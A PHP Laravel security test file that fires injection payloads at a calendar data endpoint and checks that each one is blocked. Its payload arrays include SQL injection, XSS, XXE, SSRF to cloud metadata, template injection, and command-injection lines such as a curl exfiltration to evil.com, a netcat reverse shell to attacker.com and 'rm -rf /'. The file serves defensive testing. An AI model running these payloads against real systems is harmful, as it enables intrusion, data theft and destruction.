<?php

namespace Tests\Feature;

use Tests\TestCase;
use App\Models\Activity;
use App\Models\Announcement;
use App\Models\Organization;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\RateLimiter;
use Carbon\Carbon;

class CalendarSecurityTest extends TestCase
{
    use RefreshDatabase;

    private User $user;
    private Organization $organization;

    protected function setUp(): void
    {
        parent::setUp();
        
        $this->user = User::factory()->create();
        $this->organization = Organization::factory()->create();

        // Create test data
        Activity::factory()->create([
            'title' => 'Test Activity',
            'status' => 'published',
            'organization_id' => $this->organization->id,
            'created_by' => $this->user->id,
            'start_date' => '2024-01-15',
            'end_date' => '2024-01-15'
        ]);
    }

    /**
     * Test calendar input validation for SQL injection attempts.
     */
    public function test_calendar_input_validation_sql_injection(): void
    {
        $maliciousInputs = [
            "'; DROP TABLE activities; --",
            "' OR '1'='1",
            "1' UNION SELECT * FROM users --",
            "'; DELETE FROM announcements; --",
            "' OR 1=1 #",
            "admin'--",
            "' OR 'x'='x",
            "1'; EXEC xp_cmdshell('dir'); --"
        ];

        foreach ($maliciousInputs as $maliciousInput) {
            $response = $this->getJson('/calendar/data', [
                'start' => $maliciousInput,
                'end' => '2024-01-31',
                'search' => $maliciousInput
            ]);

            // Should return validation error, not execute malicious query
            $response->assertStatus(422);
            $response->assertJsonValidationErrors(['start']);
        }

        // Verify data integrity
        $this->assertDatabaseHas('activities', ['title' => 'Test Activity']);
        $this->assertDatabaseCount('activities', 1);
    }

    /**
     * Test calendar input validation for XSS attempts.
     */
    public function test_calendar_input_validation_xss_attempts(): void
    {
        $xssPayloads = [
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<svg onload="alert(\'XSS\')">',
            '"><script>alert("XSS")</script>',
            '\';alert("XSS");//',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload="alert(\'XSS\')">'
        ];

        foreach ($xssPayloads as $payload) {
            $response = $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31',
                'search' => $payload
            ]);

            $response->assertStatus(200);
            
            // Verify XSS payload is not present in response
            $responseContent = $response->getContent();
            $this->assertStringNotContainsString('<script>', $responseContent);
            $this->assertStringNotContainsString('javascript:', $responseContent);
            $this->assertStringNotContainsString('onerror=', $responseContent);
            $this->assertStringNotContainsString('onload=', $responseContent);
        }
    }

    /**
     * Test calendar input validation for path traversal attempts.
     */
    public function test_calendar_input_validation_path_traversal(): void
    {
        $pathTraversalPayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            'file:///etc/passwd',
            '/etc/passwd'
        ];

        foreach ($pathTraversalPayloads as $payload) {
            $response = $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31',
                'search' => $payload
            ]);

            $response->assertStatus(200);
            
            // Verify path traversal payload is not executed
            $responseContent = $response->getContent();
            $this->assertStringNotContainsString('root:x:0:0', $responseContent);
        }
    }

    /**
     * Test calendar input validation for command injection attempts.
     */
    public function test_calendar_input_validation_command_injection(): void
    {
        $commandInjectionPayloads = [
            '; ls -la',
            '| cat /etc/passwd',
            '&& rm -rf /',
            '`whoami`',
            '$(id)',
            '; curl http://evil.com/steal-data',
            '| nc attacker.com 4444 -e /bin/sh',
            '; ping -c 10 127.0.0.1'
        ];

        foreach ($commandInjectionPayloads as $payload) {
            $response = $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31',
                'search' => $payload
            ]);

            $response->assertStatus(200);
            
            // Verify command injection is not executed
            // (This is a basic check - in real scenarios you'd monitor system calls)
            $this->assertNotEquals(500, $response->status());
        }
    }

    /**
     * Test calendar input validation for NoSQL injection attempts.
     */
    public function test_calendar_input_validation_nosql_injection(): void
    {
        $nosqlPayloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "function() { return true; }"}',
            '{"$or": [{"title": {"$ne": null}}]}',
            '{"$in": ["admin", "user"]}',
            '{"$exists": true}',
            '{"$elemMatch": {"title": "admin"}}'
        ];

        foreach ($nosqlPayloads as $payload) {
            $response = $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31',
                'search' => $payload
            ]);

            $response->assertStatus(200);
            
            // Should not return unauthorized data
            $events = $response->json();
            foreach ($events as $event) {
                $this->assertNotEquals('admin', $event['title']);
            }
        }
    }

    /**
     * Test calendar input validation for LDAP injection attempts.
     */
    public function test_calendar_input_validation_ldap_injection(): void
    {
        $ldapPayloads = [
            '*)(uid=*',
            '*)(|(objectClass=*)',
            '*)(|(cn=*))',
            '*)(|(sn=*))',
            '*)(|(mail=*))',
            '*)(|(telephoneNumber=*))',
            '*)(|(description=*))',
            '*))(|(objectClass=*)'
        ];

        foreach ($ldapPayloads as $payload) {
            $response = $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31',
                'search' => $payload
            ]);

            $response->assertStatus(200);
            
            // Should not cause LDAP errors or return unexpected data
            $this->assertNotEquals(500, $response->status());
        }
    }

    /**
     * Test calendar input validation for XXE injection attempts.
     */
    public function test_calendar_input_validation_xxe_injection(): void
    {
        $xxePayloads = [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/malicious.xml">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>'
        ];

        foreach ($xxePayloads as $payload) {
            $response = $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31',
                'search' => $payload
            ]);

            $response->assertStatus(200);
            
            // Should not expose file contents
            $responseContent = $response->getContent();
            $this->assertStringNotContainsString('root:x:0:0', $responseContent);
            $this->assertStringNotContainsString('<?php', $responseContent);
        }
    }

    /**
     * Test calendar input validation for SSRF attempts.
     */
    public function test_calendar_input_validation_ssrf_attempts(): void
    {
        $ssrfPayloads = [
            'http://localhost/admin',
            'http://127.0.0.1:22',
            'http://169.254.169.254/latest/meta-data/', // AWS metadata
            'http://metadata.google.internal', // GCP metadata
            'file:///etc/passwd',
            'ftp://evil.com/secret.txt',
            'gopher://127.0.0.1:70/_info',
            'dict://127.0.0.1:11211/stats'
        ];

        foreach ($ssrfPayloads as $payload) {
            $response = $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31',
                'search' => $payload
            ]);

            $response->assertStatus(200);
            
            // Should not make internal requests
            $this->assertNotEquals(500, $response->status());
        }
    }

    /**
     * Test calendar input validation for deserialization attacks.
     */
    public function test_calendar_input_validation_deserialization_attacks(): void
    {
        $deserializationPayloads = [
            'O:8:"stdClass":0:{}',
            'a:1:{i:0;i:1;}',
            'b:1;i:1;',
            'd:1.23;',
            'i:123;',
            's:4:"test";',
            'N;',
            'r:1;'
        ];

        foreach ($deserializationPayloads as $payload) {
            $response = $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31',
                'search' => $payload
            ]);

            $response->assertStatus(200);
            
            // Should not cause deserialization vulnerabilities
            $this->assertNotEquals(500, $response->status());
        }
    }

    /**
     * Test calendar input validation for template injection attempts.
     */
    public function test_calendar_input_validation_template_injection(): void
    {
        $templatePayloads = [
            '{{7*7}}',
            '${7*7}',
            '#{7*7}',
            '{{config.items()}}',
            '${7*7}',
            "{{'.__class__.__mro__[2].__subclasses__()}}",
            '${T(java.lang.Runtime).getRuntime().exec(\'whoami\')}',
            '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'whoami\').read()}}'
        ];

        foreach ($templatePayloads as $payload) {
            $response = $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31',
                'search' => $payload
            ]);

            $response->assertStatus(200);
            
            // Should not execute template injection
            $responseContent = $response->getContent();
            $this->assertStringNotContainsString('49', $responseContent); // 7*7=49
            $this->assertStringNotContainsString('root', $responseContent);
        }
    }

    /**
     * Test calendar rate limiting functionality.
     */
    public function test_calendar_rate_limiting(): void
    {
        // Clear any existing rate limit cache
        Cache::flush();

        $responses = [];
        
        // Make rapid requests to trigger rate limiting
        for ($i = 0; $i < 70; $i++) { // More than the 60 requests per minute limit
            $responses[] = $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31'
            ]);
        }

        // First 60 requests should succeed
        for ($i = 0; $i < 60; $i++) {
            $responses[$i]->assertStatus(200);
        }

        // Requests beyond the limit should be rate limited
        for ($i = 60; $i < 70; $i++) {
            $responses[$i]->assertStatus(429);
            $responses[$i]->assertJson([
                'message' => 'Too Many Attempts.'
            ]);
        }
    }

    /**
     * Test calendar rate limiting with different endpoints.
     */
    public function test_calendar_rate_limiting_different_endpoints(): void
    {
        Cache::flush();

        $endpoints = [
            '/calendar/data',
            '/calendar/month/2024/1',
            '/calendar/week/2024/1',
            '/calendar/day/2024/1/15'
        ];

        foreach ($endpoints as $endpoint) {
            // Make rapid requests to each endpoint
            for ($i = 0; $i < 65; $i++) {
                $response = $this->getJson($endpoint, [
                    'start' => '2024-01-01',
                    'end' => '2024-01-31'
                ]);

                if ($i < 60) {
                    $response->assertStatus(200);
                } else {
                    $response->assertStatus(429);
                }
            }

            Cache::flush(); // Reset for next endpoint
        }
    }

    /**
     * Test calendar rate limiting recovery.
     */
    public function test_calendar_rate_limiting_recovery(): void
    {
        Cache::flush();

        // Exhaust rate limit
        for ($i = 0; $i < 65; $i++) {
            $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31'
            ]);
        }

        // Should be rate limited
        $response = $this->getJson('/calendar/data', [
            'start' => '2024-01-01',
            'end' => '2024-01-31'
        ]);
        $response->assertStatus(429);

        // Wait for rate limit to reset (simulate time passing)
        // In real tests, you might use Carbon::setTestNow() to simulate time
        sleep(1);

        // Clear rate limit cache to simulate time passing
        Cache::flush();

        // Should work again after rate limit reset
        $response = $this->getJson('/calendar/data', [
            'start' => '2024-01-01',
            'end' => '2024-01-31'
        ]);
        $response->assertStatus(200);
    }

    /**
     * Test calendar input validation for large payloads.
     */
    public function test_calendar_input_validation_large_payloads(): void
    {
        $largePayload = str_repeat('A', 10000); // 10KB string

        $response = $this->getJson('/calendar/data', [
            'start' => '2024-01-01',
            'end' => '2024-01-31',
            'search' => $largePayload
        ]);

        // Should handle large payloads gracefully
        $response->assertStatus(200);
    }

    /**
     * Test calendar input validation for null bytes.
     */
    public function test_calendar_input_validation_null_bytes(): void
    {
        $nullBytePayloads = [
            "test\x00payload",
            "\x00malicious",
            "test\x00\x00payload",
            "payload\x00",
            "\x00",
            "test\x00admin\x00payload"
        ];

        foreach ($nullBytePayloads as $payload) {
            $response = $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31',
                'search' => $payload
            ]);

            $response->assertStatus(200);
            
            // Null bytes should be handled safely
            $responseContent = $response->getContent();
            $this->assertStringNotContainsString("\x00", $responseContent);
        }
    }

    /**
     * Test calendar input validation for Unicode attacks.
     */
    public function test_calendar_input_validation_unicode_attacks(): void
    {
        $unicodePayloads = [
            '𝒶𝒹𝓂𝒾𝓃', // Mathematical script
            'ａｄｍｉｎ', // Full-width characters
            'admin\u200b', // Zero-width space
            'admin\u200c', // Zero-width non-joiner
            'admin\u200d', // Zero-width joiner
            'admin\ufeff', // Zero-width no-break space
            'admin\u2060', // Word joiner
            'admin\u180e', // Mongolian vowel separator
        ];

        foreach ($unicodePayloads as $payload) {
            $response = $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31',
                'search' => $payload
            ]);

            $response->assertStatus(200);
            
            // Should not match admin with Unicode tricks
            $events = $response->json();
            foreach ($events as $event) {
                $this->assertNotEquals('admin', strtolower($event['title']));
            }
        }
    }

    /**
     * Test calendar input validation for encoding attacks.
     */
    public function test_calendar_input_validation_encoding_attacks(): void
    {
        $encodingPayloads = [
            '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E', // URL encoded script
            '&#60;script&#62;alert&#40;&#34;XSS&#34;&#41;&#60;&#47;script&#62;', // HTML encoded
            '%253Cscript%253Ealert%2528%2522XSS%2522%2529%253C%252Fscript%253E', // Double URL encoded
            '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;', // HTML entity encoded
            '\u003Cscript\u003Ealert\u0028\u0022XSS\u0022\u0029\u003C\u002Fscript\u003E', // Unicode encoded
        ];

        foreach ($encodingPayloads as $payload) {
            $response = $this->getJson('/calendar/data', [
                'start' => '2024-01-01',
                'end' => '2024-01-31',
                'search' => $payload
            ]);

            $response->assertStatus(200);
            
            // Should not execute encoded malicious content
            $responseContent = $response->getContent();
            $this->assertStringNotContainsString('<script>', $responseContent);
            $this->assertStringNotContainsString('alert(', $responseContent);
        }
    }

    /**
     * Test calendar CSRF protection.
     */
    public function test_calendar_csrf_protection(): void
    {
        // Test POST requests (if calendar has POST endpoints)
        $response = $this->post('/calendar/data', [
            'start' => '2024-01-01',
            'end' => '2024-01-31'
        ]);

        // Should require CSRF token for POST requests
        $response->assertStatus(419); // CSRF token mismatch
    }

    /**
     * Test calendar authentication bypass attempts.
     */
    public function test_calendar_authentication_bypass_attempts(): void
    {
        // Test with manipulated session data
        $response = $this->withSession([
            'user_id' => 999, // Non-existent user
            'is_admin' => true
        ])->getJson('/calendar/data', [
            'start' => '2024-01-01',
            'end' => '2024-01-31'
        ]);

        // Should not allow authentication bypass
        $response->assertStatus(200);
        
        // Should not expose unauthorized data
        $events = $response->json();
        $this->assertNotEmpty($events); // Public calendar data should be accessible
    }

    /**
     * Test calendar authorization bypass attempts.
     */
    public function test_calendar_authorization_bypass_attempts(): void
    {
        // Create user with limited permissions
        $limitedUser = User::factory()->create(['is_admin' => false]);
        
        // Create private activity
        $privateActivity = Activity::factory()->create([
            'title' => 'Private Activity',
            'status' => 'draft', // Not published
            'organization_id' => $this->organization->id,
            'created_by' => $this->user->id
        ]);

        $response = $this->actingAs($limitedUser)->getJson('/calendar/data', [
            'start' => '2024-01-01',
            'end' => '2024-01-31'
        ]);

        $response->assertStatus(200);
        
        // Should not include unpublished activities
        $events = $response->json();
        $titles = collect($events)->pluck('title');
        $this->assertNotContains('Private Activity', $titles);
    }
}